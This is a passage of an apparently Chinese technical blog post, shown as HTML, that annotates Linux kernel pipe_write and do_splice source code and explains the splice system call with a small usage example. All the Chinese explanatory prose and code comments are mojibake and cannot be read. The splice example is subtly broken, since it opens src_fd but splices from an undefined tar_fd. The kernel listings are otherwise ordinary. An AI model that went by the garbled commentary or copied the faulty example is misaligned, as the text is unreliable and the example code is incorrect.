class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br><br>			pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>			<span class="hljs-comment">/* Insert it into the buffer array */</span><br>			buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>			buf-&gt;page = page;<br>			buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = <span class="hljs-number">0</span>;<br>			<span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">//ËÆæÁΩÆ buffer ÁöÑ flagÔºåËã•ËÆæÁΩÆ‰∫Ü O_DIRECT Âàô‰∏∫ PACKET</span><br>				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>			<span class="hljs-keyword">else</span><br>				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>			pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>			copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br>			<span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			ret += copied;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = copied;<br><br>			<span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br>			<span class="hljs-keyword">continue</span>;<br><br>		<span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>        <span class="hljs-comment">//Â¶ÇÊûúÊñá‰ª∂Ê†áÂøó‰∏∫ÈùûÈòªÂ°ûÔºåÂàôËøîÂõûÈîôËØØÁ†Å -EAGAIN</span><br>		<span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EAGAIN;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>        <span class="hljs-comment">//Â¶ÇÊûúÂΩìÂâçËøõÁ®ãÊúâ‰ø°Âè∑Á≠âÂæÖÔºåÂàôËøîÂõûÈîôËØØÁ†Å -ERESTARTSYS</span><br>		<span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -ERESTARTSYS;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We&#x27;re going to release the pipe lock and wait for more</span><br><span class="hljs-comment">		 * space. We wake up any readers if necessary, and then</span><br><span class="hljs-comment">		 * after waiting we need to re-check whether the pipe</span><br><span class="hljs-comment">		 * become empty while we dropped the lock.</span><br><span class="hljs-comment">		 */</span><br>        <span class="hljs-comment">//ÈáäÊîæÁÆ°ÈÅìÈîÅÂπ∂Á≠âÂæÖÁºìÂÜ≤Âå∫Á©∫Èó¥ÂèòÂæóÂèØÁî®ÔºåÂî§ÈÜí‰ªª‰ΩïÂèØËÉΩÊ≠£Âú®Á≠âÂæÖËØªÂèñÁöÑËøõÁ®ã„ÄÇÂæÖÁ≠âÂæÖÁªìÊùüÂêéÔºåÈáçÊñ∞Ëé∑ÂèñÁÆ°ÈÅìÈîÅÂπ∂ÈáçÊñ∞Ê£ÄÊü•ÁÆ°ÈÅìÊòØÂê¶‰∏∫Á©∫Ôºå‰ª•Á°ÆÂÆöÊòØÂê¶ÈúÄË¶ÅÁªßÁª≠ÊâßË°åÂÜôÂÖ•Êìç‰Ωú„ÄÇ</span><br>		__pipe_unlock(pipe);<br>		<span class="hljs-keyword">if</span> (was_empty) &#123;<br>			wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>			kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>		&#125;<br>		wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>		__pipe_lock(pipe);<br>		was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>		wake_next_writer = <span class="hljs-literal">true</span>;<br>	&#125;<br>out:<br>    <span class="hljs-comment">//Âú®ÂÜôÂÖ•ÂÆåÊàêÂêéÔºåÂ¶ÇÊûú‰πãÂâçÁÆ°ÈÅìÂ∑≤Êª°ÔºåÂàôÂèñÊ∂àÂî§ÈÜí‰∏ã‰∏Ä‰∏™ÂÜôÂÖ•ËÄÖÁöÑÊìç‰Ωú</span><br>	<span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>		wake_next_writer = <span class="hljs-literal">false</span>;<br>	__pipe_unlock(pipe);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span><br><span class="hljs-comment">	 * want the reader to start processing things asap, rather than</span><br><span class="hljs-comment">	 * leave the data pending.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * This is particularly important for small writes, because of</span><br><span class="hljs-comment">	 * how (for example) the GNU make jobserver uses small writes to</span><br><span class="hljs-comment">	 * wake up pending jobs</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//Ëß£ÈîÅÁÆ°ÈÅìÔºåÂπ∂Ê†πÊçÆÊÉÖÂÜµÂî§ÈÜíÁ≠âÂæÖÁöÑËØªÂèñËÄÖÊàñÂÜôÂÖ•ËÄÖ</span><br>	<span class="hljs-keyword">if</span> (was_empty) &#123;<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>	&#125;<br>    <span class="hljs-comment">//Â¶ÇÊûúÂÜôÂÖ•ÊàêÂäü‰∏îÊàêÂäüËé∑Âèñ‰∫ÜÊñá‰ª∂Á≥ªÁªüÂÜôÈîÅÔºåÂàôÊõ¥Êñ∞Êñá‰ª∂ÁöÑËÆøÈóÆÊó∂Èó¥</span><br>	<span class="hljs-keyword">if</span> (wake_next_writer)<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br>		<span class="hljs-type">int</span> err = file_update_time(filp);<br>		<span class="hljs-keyword">if</span> (err)<br>			ret = err;<br>		sb_end_write(file_inode(filp)-&gt;i_sb);<br>	&#125;<br>    <span class="hljs-comment">//ËøîÂõûÂÜôÂÖ•ÁöÑÊÄªÂ≠óËäÇÊï∞ ret</span><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="‰Ωï‰∏∫splice"><a href="#‰Ωï‰∏∫splice" class="headerlink" title="‰Ωï‰∏∫splice"></a>‰Ωï‰∏∫splice</h2><p>‰∏ÄËà¨Êù•ËØ¥ÔºåÊÉ≥Ë¶ÅÊää‰∏Ä‰∏™Êñá‰ª∂ÁöÑÊï∞ÊçÆÊã∑Ë¥ùÂà∞Âè¶‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÂ∏∏ËßÑÊÄùË∑Ø‰æøÊòØÊâìÂºÄÊñá‰ª∂1ÔºåÂ§çÂà∂Âà∞Áî®Êà∑Á©∫Èó¥ÔºåÂÜôÂÖ•Êñá‰ª∂2</p>
<p>‰ΩÜËøôÊ†∑Áî®Êà∑Á©∫Èó¥ÂíåÂÜÖÊ†∏Á©∫Èó¥‰πãÈó¥Ë¶ÅËøõË°åÂ§öÊ¨°Áî®Êà∑Êã∑Ë¥ùÔºåÂ≠òÂú®ÂÆ¢ËßÇÁöÑÂºÄÈîÄ</p>
<p>ÊâÄ‰ª•ËøôÊó∂ÂÄô‰æøË¶ÅÊèêÂà∞<strong>splice</strong>Ëøô‰∏™Áî®‰∫éÂú®‰∏§‰∏™Êñá‰ª∂ÊèèËø∞Á¨¶‰πãÈó¥ÁßªÂä®Êï∞ÊçÆÁöÑÁ≥ªÁªüË∞ÉÁî®Âï¶</p>
<p><code>splice</code> ÂáΩÊï∞ÊòØÂú® Unix&#x2F;Linux Á≥ªÁªü‰∏≠Áî®‰∫éÂú®‰∏§‰∏™Êñá‰ª∂ÊèèËø∞Á¨¶‰πãÈó¥ÁßªÂä®Êï∞ÊçÆÁöÑÁ≥ªÁªüË∞ÉÁî®‰πã‰∏Ä„ÄÇÂÆÉÈÄöÂ∏∏Áî®‰∫é‰ºòÂåñÊï∞ÊçÆ‰º†ËæìÔºåÁâπÂà´ÊòØÂú®Êñá‰ª∂ÂíåÁÆ°ÈÅì‰πãÈó¥ËøõË°åÈõ∂Êã∑Ë¥ù‰º†Ëæì„ÄÇ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out, <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br><br>ÂèÇÊï∞ËØ¥Êòé<br>fd_inÔºöËæìÂÖ•Êñá‰ª∂ÊèèËø∞Á¨¶ÔºåÊï∞ÊçÆÂ∞Ü‰ªéËøôÈáåËØªÂèñ„ÄÇ<br>off_inÔºöËæìÂÖ•Êñá‰ª∂ÁöÑÂÅèÁßªÈáèÊåáÈíàÔºåÂ¶ÇÊûú‰∏∫ <span class="hljs-literal">NULL</span>ÔºåÂàô‰ΩøÁî®ÂΩìÂâçÊñá‰ª∂ÂÅèÁßªÈáè„ÄÇ<br>fd_outÔºöËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ÔºåÊï∞ÊçÆÂ∞ÜÂÜôÂÖ•Âà∞ËøôÈáå„ÄÇ<br>off_outÔºöËæìÂá∫Êñá‰ª∂ÁöÑÂÅèÁßªÈáèÊåáÈíàÔºåÂ¶ÇÊûú‰∏∫ <span class="hljs-literal">NULL</span>ÔºåÂàô‰ΩøÁî®ÂΩìÂâçÊñá‰ª∂ÂÅèÁßªÈáè„ÄÇ<br>lenÔºöË¶ÅÁßªÂä®ÁöÑÊï∞ÊçÆÁöÑÈïøÂ∫¶„ÄÇ<br>flagsÔºöÊ†áÂøóÂèÇÊï∞ÔºåÂèØ‰ª•ÊòØ‰ª•‰∏ã‰πã‰∏ÄÊàñÂÆÉ‰ª¨ÁöÑÁªÑÂêàÔºö<br>SPLICE_F_MOVEÔºöÈªòËÆ§Ë°å‰∏∫ÔºåË°®Á§∫Â∞ÜÊï∞ÊçÆ‰ªéËæìÂÖ•Êñá‰ª∂ÊèèËø∞Á¨¶ÁßªÂä®Âà∞ËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ÔºåËøôÊÑèÂë≥ÁùÄÊï∞ÊçÆÂú®ÁßªÂä®Âêé‰∏çÂÜçÂ≠òÂú®‰∫éËæìÂÖ•Êñá‰ª∂ÊèèËø∞Á¨¶‰∏ä„ÄÇ<br>SPLICE_F_NONBLOCKÔºöÈùûÈòªÂ°ûÊ®°ÂºèÔºåÂ¶ÇÊûúËÆæÁΩÆ‰∫ÜÊ≠§Ê†áÂøóÔºåÂáΩÊï∞Â∞Ü‰ª•ÈùûÈòªÂ°ûÊ®°ÂºèËøêË°å„ÄÇ<br>SPLICE_F_MOREÔºöÊèêÁ§∫ÂÜÖÊ†∏Á≠âÂæÖÊõ¥Â§öÊï∞ÊçÆÔºåÂ¶ÇÊûúËÆæÁΩÆ‰∫ÜÊ≠§Ê†áÂøóÔºåÂàôÂëäËØâÂÜÖÊ†∏ËøòÊúâÊõ¥Â§öÊï∞ÊçÆÈúÄË¶ÅÁßªÂä®„ÄÇËøôÂèØËÉΩ‰ºöÂ¢ûÂä†ÊÄßËÉΩ„ÄÇ<br>SPLICE_F_GIFTÔºöË°®Á§∫Â∞ÜÊï∞ÊçÆÊâÄÊúâÊùÉÁßªÂä®Âà∞ËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ÔºåËÄå‰∏çÊòØ‰ªÖÁßªÂä®Êï∞ÊçÆÊú¨Ë∫´„ÄÇ<br></code></pre></td></tr></table></figure>

<p>PSÔºöÂ∞Üfd_in‰º†ÈÄíÂà∞Êñá‰ª∂ÊèèËø∞Á¨¶fd_outÔºåÂÖ∂‰∏≠Êñá‰ª∂ÊèèËø∞Á¨¶‰πã‰∏ÄÂøÖÈ°ªÂºïÁî®ÁÆ°ÈÅìÔºåÂØπ‰∫éfd_inÊù•ËØ¥ÔºåËã•ÂÖ∂ÊòØ‰∏Ä‰∏™ÁÆ°ÈÅìÊñá‰ª∂ÊèèËø∞Á¨¶ÔºåÂàôoff_inÂøÖÈ°ªË¢´ËÆæÁΩÆ‰∏∫NULLÔºåËã•ÂÆÉ‰∏çÊòØ‰∏Ä‰∏™ÁÆ°ÈÅìÊèèËø∞Á¨¶ÔºåÂàôoff_inË°®Á§∫‰ªéËæìÂÖ•Êï∞ÊçÆÊµÅÁöÑ‰ΩïÂ§ÑÂºÄÂßãËØªÂÖ•Êï∞ÊçÆÔºåÊ≠§Êó∂ÔºåÂÖ∂Ë¢´ËÆæÁΩÆ‰∏∫NULLÔºåÂàôËØ¥Êòé‰ªéËæìÂÖ•Êï∞ÊçÆÁöÑÂΩìÂâçÂÅèÁßª‰ΩçÁΩÆËØªÂÖ•„ÄÇÂê¶Âàôoff_inÊåáÂá∫ÂÖ∑‰ΩìÁöÑÂÅèÁßª‰ΩçÁΩÆ„ÄÇ‰ª•‰∏äÂØπ‰∫éfd_outÂíåoff_outÂêåÊ†∑ÈÄÇÁî®ÔºåÂè™‰∏çËøáÂÖ∂Áî®‰∫éËæìÂá∫Êï∞ÊçÆÊµÅ„ÄÇ</p>
<h3 id="splice-pipe"><a href="#splice-pipe" class="headerlink" title="splice &amp; pipe"></a>splice &amp; pipe</h3><p>ÈíàÂØπ‰∏äËø∞ÊÉÖÂÜµÔºåÊàë‰ª¨Âè™ËÆ∏ÂàõÂª∫‰∏Ä‰∏™ÁÆ°ÈÅìÔºåÁÑ∂ÂêéÈÄöËøá‰∏§Ê¨°splice‰æøËÉΩÂÆåÊàê‰∏§‰∏™Êñá‰ª∂Èó¥ÁöÑÊï∞ÊçÆÊã∑Ë¥ù</p>
<p>Â§ßÊ¶ÇÊ†∑‰æãÂ¶Ç‰∏ãÊâÄÁ§∫</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br>pipe(pipe_fd);<br>src_fd = open(<span class="hljs-string">&quot;source_file&quot;</span>, O_RDWR);<br>splice(tar_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br><br>dest_fd = open(<span class="hljs-string">&quot;dest_file&quot;</span>, O_RDWR);<br>splice(pipe_fd[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, dest_fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br>......<br></code></pre></td></tr></table></figure>

<p>Êó†ÈúÄËøõË°åÂÜÖÊ†∏Á©∫Èó¥ÂíåÁî®Êà∑Á©∫Èó¥ÁöÑÊã∑Ë¥ùÔºåÁõ¥Êé•Âú®ÂÜÖÊ†∏ÂÆåÊàê‰∏ÄÊù°ÈæôÊúçÂä°</p>
<h3 id="do-splice"><a href="#do-splice" class="headerlink" title="do_splice"></a>do_splice</h3><p>Ê†πÊçÆÁÆ°ÈÅì-&gt;ÁÆ°ÈÅì„ÄÅÊñá‰ª∂-&gt;ÁÆ°ÈÅì„ÄÅÊñá‰ª∂-&gt;ÁÆ°ÈÅìÔºåÂàÜ‰∏∫‰∏â‰∏™ÂàÜÊîØ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">do_splice</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> __user *off_in,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> file *out, <span class="hljs-type">loff_t</span> __user *off_out,</span><br><span class="hljs-params">		<span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br>	<span class="hljs-type">loff_t</span> offset;<br>	<span class="hljs-type">long</span> ret;<br>	<br>    <span class="hljs-comment">//ÈÄöËøáÊ£ÄÊü•ËæìÂÖ•ÂíåËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÊ®°ÂºèÔºàmodeÔºâÊù•Á°Æ‰øùÂÆÉ‰ª¨ÊòØÂèØËØªÂíåÂèØÂÜôÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶„ÄÇÂ¶ÇÊûúÂÖ∂‰∏≠‰∏Ä‰∏™‰∏çÁ¨¶ÂêàË¶ÅÊ±ÇÔºåÂàôËøîÂõûÈîôËØØÁ†Å-EBADFÔºåË°®Á§∫Êó†ÊïàÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶„ÄÇ</span><br>	<span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||<br>		     !(out-&gt;f_mode &amp; FMODE_WRITE)))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>    <br>	<span class="hljs-comment">//‰ΩøÁî®get_pipe_info()ÂáΩÊï∞Ëé∑ÂèñËæìÂÖ•ÂíåËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ÂØπÂ∫îÁöÑÁÆ°ÈÅì‰ø°ÊÅØ</span><br>	ipipe = get_pipe_info(in, <span class="hljs-literal">true</span>);<br>	opipe = get_pipe_info(out, <span class="hljs-literal">true</span>);<br>    <br>	<span class="hljs-comment">//Â¶ÇÊûú‰∏§ËÄÖÈÉΩÊòØÁÆ°ÈÅìÔºåÂàôËøõË°åÁÆ°ÈÅìÂà∞ÁÆ°ÈÅìÁöÑspliceÊìç‰Ωú</span><br>	<span class="hljs-keyword">if</span> (ipipe &amp;&amp; opipe) &#123;<br>        <span class="hljs-comment">//Â∞ùËØïÂú®ÁÆ°ÈÅì‰∏äÊâßË°åÂÖ∑ÊúâÊåáÂÆöÂÅèÁßªÈáèÁöÑÊìç‰ΩúÔºåËøôÂú®ÁÆ°ÈÅìÊìç‰Ωú‰∏≠ÊòØ‰∏çË¢´ÂÖÅËÆ∏ÁöÑ</span><br>		<span class="hljs-keyword">if</span> (off_in || off_out)<br>			<span class="hljs-keyword">return</span> -ESPIPE;<br><br>		<span class="hljs-comment">/* Splicing to self would be fun, but... */</span><br>        <span class="hljs-comment">//Ê£ÄÊü•ËæìÂÖ•ÁÆ°ÈÅìÂíåËæìÂá∫ÁÆ°ÈÅìÊòØÂê¶Áõ∏Âêå„ÄÇÂ¶ÇÊûúÂÆÉ‰ª¨Áõ∏ÂêåÔºåË°®Á§∫Â∞ùËØïÂ∞ÜÊï∞ÊçÆ‰ªéÁÆ°ÈÅìÊã∑Ë¥ùÂà∞Ëá™Ë∫´ÔºåËøôÊòØÊ≤°ÊúâÊÑè‰πâÁöÑÊìç‰Ωú</span><br>		<span class="hljs-keyword">if</span> (ipipe == opipe)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<br>         <span class="hljs-comment">//Ê£ÄÊü•ËæìÂÖ•Êñá‰ª∂ÂíåËæìÂá∫Êñá‰ª∂ÁöÑÊ†áÂøóÔºåÂ¶ÇÊûúÂÖ∂‰∏≠‰ªª‰Ωï‰∏Ä‰∏™ËÆæÁΩÆ‰∫ÜO_NONBLOCKÊ†áÂøóÔºåÂàôÂ∞ÜSPLICE_F_NONBLOCKÊ†áÂøóÊ∑ªÂä†Âà∞flags‰∏≠</span><br>		<span class="hljs-keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)<br>			flags |= SPLICE_F_NONBLOCK;<br><br>		<span class="hljs-keyword">return</span> splice_pipe_to_pipe(ipipe, opipe, len, flags);<br>	&#125;<br><br>    <span class="hljs-comment">//Â¶ÇÊûúÂè™ÊúâËæìÂÖ•Êñá‰ª∂ÊèèËø∞Á¨¶ÊòØÁÆ°ÈÅìÔºåÂàôÊâßË°å‰ªéÁÆ°ÈÅìÂà∞Êñá‰ª∂ÁöÑspliceÊìç‰Ωú</span><br>	<span class="hljs-keyword">if</span> (ipipe) &#123;<br>        <span class="hljs-comment">//Âú®‰ªéÁÆ°ÈÅì‰∏≠ËØªÂèñÊï∞ÊçÆÊó∂Ôºå‰∏çÂÖÅËÆ∏ÊåáÂÆöÂÅèÁßªÈáè</span><br>		<span class="hljs-keyword">if</span> (off_in)<br>			<span class="hljs-keyword">return</span> -ESPIPE;<br>		<span class="hljs-keyword">if</span> (off_out) &#123;<br>			<span class="hljs-keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))<span class="hljs-comment">//ÂÖàÊ£ÄÊü•ËæìÂá∫Êñá‰ª∂ÊòØÂê¶ÊîØÊåÅÂÜôÂÖ•Êìç‰ΩúÔºàÂç≥ÊòØÂê¶ÊîØÊåÅPWRITEÊ®°ÂºèÔºâ</span><br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			<span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//‰ªéÁî®Êà∑Á©∫Èó¥Êã∑Ë¥ùËæìÂá∫ÂÅèÁßªÈáèÂà∞ÂÜÖÊ†∏Á©∫Èó¥ÁöÑoffsetÂèòÈáè‰∏≠</span><br>				<span class="hljs-keyword">return</span> -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			offset = out-&gt;f_pos;<span class="hljs-comment">//Ê≤°ÊúâÊåáÂÆöËæìÂá∫ÂÅèÁßªÈáèÔºåÂàôÂ∞ÜËæìÂá∫ÂÅèÁßªÈáèËÆæÁΩÆ‰∏∫ËæìÂá∫Êñá‰ª∂ÂΩìÂâçÁöÑ‰ΩçÁΩÆ</span><br>		&#125;<br>		<br>        <span class="hljs-comment">//Ê£ÄÊü•ÊòØÂê¶ËÆæÁΩÆ‰∫ÜO_APPENDÊ†áÂøóÔºåÂ¶ÇÊûúËÆæÁΩÆ‰∫ÜÔºåË°®Á§∫Âú®ËæìÂá∫Êñá‰ª∂Êú´Â∞æËøΩÂä†Êï∞ÊçÆÔºåËøôÊòØ‰∏çÂÖÅËÆ∏ÁöÑ</span><br>		<span class="hljs-keyword">if</span> (unlikely(out-&gt;f_flags &amp; O_APPEND))<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<br>        <span class="hljs-comment">//È™åËØÅÂÜôÂÖ•Êìç‰ΩúÁöÑÊúâÊïàÊÄßÔºåÂåÖÊã¨Ê£ÄÊü•Êñá‰ª∂ÊòØÂê¶ÂèØÂÜô‰ª•ÂèäÂÜôÂÖ•‰ΩçÁΩÆÊòØÂê¶ÊúâÊïà„ÄÇ</span><br>		ret = rw_verify_area(WRITE, out, &amp;offset, len);<br>		<span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>			<span class="hljs-keyword">return</span> ret;<br>		<span class="hljs-comment">//ÁÑ∂ÂêéÊ£ÄÊü•ËæìÂÖ•Êñá‰ª∂ÊòØÂê¶ËÆæÁΩÆ‰∫ÜO_NONBLOCKÊ†áÂøóÔºåÂ¶ÇÊûúËÆæÁΩÆ‰∫ÜÔºåÂàôÂ∞ÜSPLICE_F_NONBLOCKÊ†áÂøóÊ∑ªÂä†Âà∞flags‰∏≠ÔºåË°®Á§∫ÊâßË°åÈùûÈòªÂ°ûÁöÑspliceÊìç‰Ωú</span><br>		<span class="hljs-keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)<br>			flags |= SPLICE_F_NONBLOCK;<br>        <br>		<span class="hljs-comment">//Ë∞ÉÁî®file_start_write()ÂáΩÊï∞ÈÄöÁü•Êñá‰ª∂Á≥ªÁªüÂºÄÂßãÂÜôÂÖ•Êìç‰Ωú</span><br>		file_start_write(out);<br>		ret = do_splice_from(ipipe, out, &amp;offset, len, flags);<span class="hljs-comment">//Áî±do_splice_from()ÂáΩÊï∞ÂÆåÊàê‰ªéÁÆ°ÈÅìÂà∞Êñá‰ª∂ÁöÑÊï∞ÊçÆ‰º†Ëæì</span><br>		file_end_write(out);<span class="hljs-comment">//Ë∞ÉÁî®file_end_write()ÂáΩÊï∞ÈÄöÁü•Êñá‰ª∂Á≥ªÁªüÂÜôÂÖ•Êìç‰ΩúÂ∑≤ÁªèÂÆåÊàê„ÄÇ</span><br>		<br>        <span 